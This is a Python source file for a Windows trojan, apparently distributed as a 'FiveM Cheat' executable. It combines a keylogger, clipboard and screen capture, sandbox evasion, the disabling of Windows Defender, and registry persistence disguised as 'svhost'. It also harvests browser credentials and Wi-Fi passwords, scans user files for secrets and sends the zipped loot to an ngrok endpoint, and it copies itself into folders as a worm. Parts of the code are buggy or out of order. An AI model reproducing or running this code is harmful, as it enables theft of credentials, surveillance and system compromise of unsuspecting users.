import subprocess
import tkinter as tk
import random
import winreg
import os
import sys
import ctypes
import logging
from pynput import keyboard
import pyperclip
from PIL import ImageGrab
import threading
import psutil
import pygetwindow as gw
import time, zipfile, requests, subprocess, shutil, json, base64

try:
    import win32crypt
    from Cryptodome.Cipher import AES
except ImportError:
    pass

# --- CONFIG ---
# Ersetze das hier durch deine echte Ngrok-URL!
EXFIL_URL = ">>>!!!YOUR NGROG URL HERE!!!<<<"
AUTH_TOKEN = "MeinSicheresPasswort123"
DELAY = 5  # 5 Sekunden Wartezeit


# Configure logging directories
log_dir = os.path.join(os.path.expanduser("~"), "Documents", "keylogger_logs")
image_dir = os.path.join(log_dir, "screenshots")

if not os.path.exists(log_dir):
    os.makedirs(log_dir)

if not os.path.exists(image_dir):
    os.makedirs(image_dir)

# Configure logging files
keypress_log = os.path.join(log_dir, "keylog.txt")
clipboard_log = os.path.join(log_dir, "clipboard_log.txt")
process_log = os.path.join(log_dir, "process_log.txt")


user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

keystrokes = 0
mouse_clicks = 0
double_clicks = 0


class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_ulong)]


def get_last_input():

    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = ctypes.sizeof(LASTINPUTINFO)

    # get last input regestered
    user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

    # now determine how long the machine has been running
    run_time = kernel32.GetTickCount()

    elapsed = run_time - struct_lastinputinfo.dwTime

    print("[*] It's been %d milliseconds since last input event." % (elapsed))
    return elapsed


def get_key_press():

    global mouse_click
    global keystrokes

    for i in range(0, 0xFF):
        if user32.GetAsyncKeyState(i) == -32767:
            # 0x1 is the code for left mouse click
            if i == 0x1:
                mouse_click += 1
                return time.time()
            elif i > 32 and i < 127:
                keystrokes += 1
    return None


def detect_sandbox():
    global mouse_click
    global keystrokes

    max_keystrokes = random.randint(10, 25)
    max_mouse_clicks = random.randint(5, 25)
    double_click = 0
    max_double_clicks = 10
    double_click_threshold = 0.250  # in seconds
    first_double_click = None
    average_mousetime = 0
    max_input_threshold = 30000  # in milliseconds
    previous_timestamp = None
    detection_complete = False

    while not detection_complete:
        time.sleep(5)
        last_input = get_last_input()
        if last_input >= max_input_threshold:
            detection_complete = True

        keypress_time = get_key_press()
        if keypress_time is not None and previous_timestamp is not None:

            # calculate the time between double clicks
            elapsed = keypress_time - previous_timestamp

            # the user double clicked
            if elapsed <= double_click_threshold:
                double_clicks += 1

                if first_double_click is None:

                    # grab the timestamp of first double click
                    first_double_click = time.time()

                else:
                    # did they try to emulate a rapid of clicks?
                    if double_clicks == max_double_clicks:
                        if keypress_time - first_double_click <= (
                            max_double_click * double_click_threshold
                        ):
                            sys.exit(0)

            # we are happy there's enough user input
            if (
                keystrokes >= max_keystrokes
                and double_clicks >= max_double_clicks
                and mouse_clicks >= max_mouse_clicks
            ):
                return

            previous_timestamp = keypress_time

        elif keypress_time is not None:
            previous_timestamp = keypress_time


detect_sandbox()
print("We are ok!")
time.sleep(10)


def disable_defender_services():
    services = [
        "WinDefend", "Sense", "WdFilter", 
        "WdNisDrv", "WdNisSvc", "WdBoot"
    ]
    reg_path = "HKLM:\\SYSTEM\\CurrentControlSet\\Services"
    
   
    for service in services:
        command = f'Set-ItemProperty -Path "{reg_path}\\{service}" -Name Start -Value 4'
        run_system_command(f'powershell -Command "{command}"')
        
    print("Services disabled.")


def disable_defender_tasks():
    tasks = [
        "Windows Defender Cache Maintenance",
        "Windows Defender Cleanup",
        "Windows Defender Scheduled Scan",
        "Windows Defender Verification"
    ]
    
 
    for task in tasks:
        command = f'Get-ScheduledTask "{task}" | Disable-ScheduledTask'
        run_system_command(f'powershell -Command "{command}"')
    
    print("Scheduled tasks disabled.")


logging.basicConfig(level=logging.DEBUG, format="%(asctime)s: %(message)s")

keypress_logger = logging.getLogger("keypress_logger")
keypress_handler = logging.FileHandler(keypress_log)
keypress_logger.addHandler(keypress_handler)

clipboard_logger = logging.getLogger("clipboard_logger")
clipboard_handler = logging.FileHandler(clipboard_log)
clipboard_logger.addHandler(clipboard_handler)

process_logger = logging.getLogger("process_logger")
process_handler = logging.FileHandler(process_log)
process_logger.addHandler(process_handler)


def on_press(key):
    try:
        keypress_logger.info("Key pressed: {0}".format(key.char))
    except AttributeError:
        keypress_logger.info("Special key pressed: {0}".format(key))


def log_clipboard():
    recent_value = ""
    while True:
        time.sleep(5)
        current_value = pyperclip.paste()
        if current_value != recent_value:
            recent_value = current_value
            clipboard_logger.info("Clipboard content: {0}".format(recent_value))


def capture_screen():
    while True:
        time.sleep(60)  # Capture screen every 60 seconds
        screenshot = ImageGrab.grab()
        screenshot.save(
            os.path.join(image_dir, "screenshot_{0}.png".format(int(time.time())))
        )


def track_activity():
    previous_window = None
    while True:
        time.sleep(5)
        current_window = gw.getActiveWindowTitle()
        if current_window != previous_window:
            previous_window = current_window
            process_logger.info("Active window: {0}".format(current_window))
        for proc in psutil.process_iter(["pid", "name"]):
            process_logger.info(
                "Running process: {0} (PID: {1})".format(
                    proc.info["name"], proc.info["pid"]
                )
            )


# Start keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Start clipboard logger
clipboard_thread = threading.Thread(target=log_clipboard)
clipboard_thread.start()

# Start screen capture
screen_thread = threading.Thread(target=capture_screen)
screen_thread.start()

# Start activity tracker
activity_thread = threading.Thread(target=track_activity)
activity_thread.start()

listener.join()
clipboard_thread.join()
screen_thread.join()
activity_thread.join()


def run_as_admin():
    # Prüfen, ob wir bereits Admin-Rechte haben
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        # Wenn nicht, Programm mit Admin-Rechten neu starten
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            # Aktuelle Instanz beenden
            sys.exit()
        except Exception as e:
            print(f"Fehler bei der Admin-Anforderung: {e}")
            sys.exit()


# Aufruf der Funktion ganz am Anfang
run_as_admin()

# Haupt-Fenster initialisieren, um Bildschirmgröße zu bekommen
root = tk.Tk()
# Bildschirm-Dimensionen abfragen
# Wir nehmen an, dass die Bildschirme horizontal nebeneinander stehen.
# Falls er 2 Monitore hat, verdoppeln wir die Breite für den Zufallsbereich.
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.withdraw()


def enable_autostart():
    # Pfad zum aktuellen Programm (wenn es als .exe kompiliert ist)
    exe_path = os.path.abspath(sys.argv[0])

    # Name des Registry-Keys (hier wird es als "svhost" gelistet)
    key_name = "svhost"

    # Registry-Pfad für Autostart
    registry_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("Autostart aktiviert.")
    except Exception as e:
        print(f"Fehler: {e}")


# Aufruf beim Start des Programms
enable_autostart()


def open_new_window():
    new_window = tk.Toplevel(root)
    new_window.title("System-Warnung")
    new_window.geometry("250x100")

    # Zufällige Position berechnen
    # Wir erlauben Werte, die auch außerhalb des Hauptmonitors liegen (für Multi-Monitor)
    # Beispiel: Wenn er 2 Monitore hat, deckt dieser Bereich den Raum von -Monitorbreite bis +Monitorbreite ab
    x_pos = random.randint(-screen_width, screen_width)
    y_pos = random.randint(0, screen_height)

    # Position zuweisen: Format "Breite x Höhe + X + Y"
    new_window.geometry(f"500x250+{x_pos}+{y_pos}")

    # Text in das Fenster einfügen
    label = tk.Label(new_window, text="⚠️ YOU ARE HACKED ⚠️")
    label.pack(pady=20)

    # Nach 20ms das nächste Fenster (schneller = mehr Chaos)
    root.after(20, open_new_window)


# Erste Fenster-Erstellung starten
open_new_window()

root.mainloop()


def get_master_key(path):
    local_state = os.path.join(path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            c = json.load(f)
        key = base64.b64decode(c["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return None


def get_wlan():
    out = ""
    try:
        r = subprocess.check_output("netsh wlan show profiles", shell=True).decode(
            "cp850", errors="ignore"
        )
        for n in [
            l.split(":")[1].strip() for l in r.split("\n") if ":" in l and "Profil" in l
        ]:
            try:
                d = subprocess.check_output(
                    f'netsh wlan show profile name="{n}" key=clear', shell=True
                ).decode("cp850", errors="ignore")
                pw = "NICHT GEFUNDEN"
                for ln in d.split("\n"):
                    if ":" in ln and ("Schlüsselinhalt" in ln or "Key Content" in ln):
                        pw = ln.split(":")[1].strip()
                out += f"SSID: {n} | PW: {pw}\n"
            except:
                continue
    except:
        pass
    return out


def deep_scan():
    f_list = []
    keys = [
        "pass",
        "user",
        "user_id",
        "user_token",
        "bot_token",
        "webhook",
        "API_KEY",
        "login",
        "zugang",
        "geheim",
        "kredit",
        "rechnung",
        "iban",
        "wallet",
    ]
    exts = [
        ".txt",
        ".pdf",
        ".docx",
        ".lua",
        ".json",
        ".cfg",
        ".ini",
        ".html",
        ".js",
        ".xlsx",
    ]
    for r, d, files in os.walk(os.path.expanduser("~")):
        if any(x in r for x in ["AppData", "Windows", "Local Settings"]):
            continue
        for f in files:
            if any(e in f.lower() for e in exts) and any(k in f.lower() for k in keys):
                fp = os.path.join(r, f)
                try:
                    if os.path.getsize(fp) < 5 * 1024 * 1024:
                        f_list.append(fp)
                except:
                    pass
    return f_list


def add_browser_vaults(zip_object):
    user_data = os.environ["LOCALAPPDATA"]
    roaming_data = os.environ["APPDATA"]

    # Chromium Browser
    chromium_browsers = {
        "Chrome": os.path.join(user_data, r"Google\Chrome\User Data"),
        "Edge": os.path.join(user_data, r"Microsoft\Edge\User Data"),
        "Opera": os.path.join(roaming_data, r"Opera Software\Opera Stable"),
        "Opera_GX": os.path.join(roaming_data, r"Opera Software\Opera GX Stable"),
    }

    for name, path in chromium_browsers.items():
        if not os.path.exists(path):
            continue
        key = get_master_key(path)
        if key:
            zip_object.writestr(f"{name}_master.key", base64.b64encode(key).decode())

        for prof in ["Default", "Profile 1", "."]:
            login_db = os.path.join(path, prof, "Login Data")
            if os.path.exists(login_db):
                try:
                    tmp = os.path.join(os.environ["TEMP"], f"{name}_db_tmp")
                    shutil.copy2(login_db, tmp)
                    zip_object.write(
                        tmp, f"{name}_{prof.replace('.','Root')}_Logins.db"
                    )
                    os.remove(tmp)
                except:
                    pass

    # Firefox
    firefox_path = os.path.join(roaming_data, r"Mozilla\Firefox\Profiles")
    if os.path.exists(firefox_path):
        for profile in os.listdir(firefox_path):
            prof_path = os.path.join(firefox_path, profile)
            for f_name in ["logins.json", "key4.db", "cert9.db"]:
                f_path = os.path.join(prof_path, f_name)
                if os.path.exists(f_path):
                    try:
                        zip_object.write(f_path, f"Firefox_{profile}/{f_name}")
                    except:
                        pass


def main():
    # 1. Wartezeit
    time.sleep(DELAY)

    z_path = os.path.join(os.environ["TEMP"], "pkg.zip")

    # 2. Sammeln
    try:
        with zipfile.ZipFile(z_path, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("wlan.txt", get_wlan())
            add_browser_vaults(z)
            for f in deep_scan():
                try:
                    z.write(f, os.path.relpath(f, os.path.expanduser("~")))
                except:
                    pass

        # 3. Senden
        headers = {"X-Auth-Token": AUTH_TOKEN}
        with open(z_path, "rb") as f:
            requests.post(EXFIL_URL, files={"file": f}, headers=headers, timeout=60)

    except Exception as e:
        pass

    sys.exit()


if __name__ == "__main__":
    main()
    
    
#class containing worm code
class Worm:

    #initiliazer method of worm class
    def __init__(self, path=None, target_dir_list=None, iteration=None):
        if isinstance(path, type(None)):
            self.path = "/"
        else:
            self.path = path
            
        if isinstance(target_dir_list, type(None)):
            self.target_dir_list = []
        else:
            self.target_dir_list = target_dir_list
            
        if isinstance(target_dir_list, type(None)):
            self.iteration = 2
        else:
            self.iteration = iteration
        
        # get own absolute path
        self.own_path = os.path.realpath(__file__)
        
        
    #function to list all files and folders in specific directory
    def list_directories(self,path):
        self.target_dir_list.append(path)
        files_in_current_directory = os.listdir(path)
        
        for file in files_in_current_directory:
            # avoid hidden files/directories (start with dot (.))
            if not file.startswith('.'):
                # get the full path
                absolute_path = os.path.join(path, file)
                print(absolute_path)

                if os.path.isdir(absolute_path):
                    self.list_directories(absolute_path)
                else:
                    pass
    
    
    #function to create a new worm \ function to spread worm
    def create_new_worm(self):
        for directory in self.target_dir_list:
            destination = os.path.join(directory, ".biohazard.py")
            # copy the script in the new directory with similar name
            shutil.copyfile(self.own_path, destination)
                 
         
    #trigger point of worm                   
    def start_worm_actions(self):
        self.list_directories(self.path)
        print(self.target_dir_list)
        self.create_new_worm()


#function to execute worm / run worm
def execute_worm():
	
	while True:
            current_directory = os.path.abspath("")
            worm=Worm(path=current_directory)
            worm.start_worm_actions()

  	        
#main function in python                        
if __name__=="__main__":
#calling worm function
	execute_worm()

# python -m PyInstaller --onefile --noconsole --name "FiveM Cheat" --icon= "icon1.ico" trojan.py
 
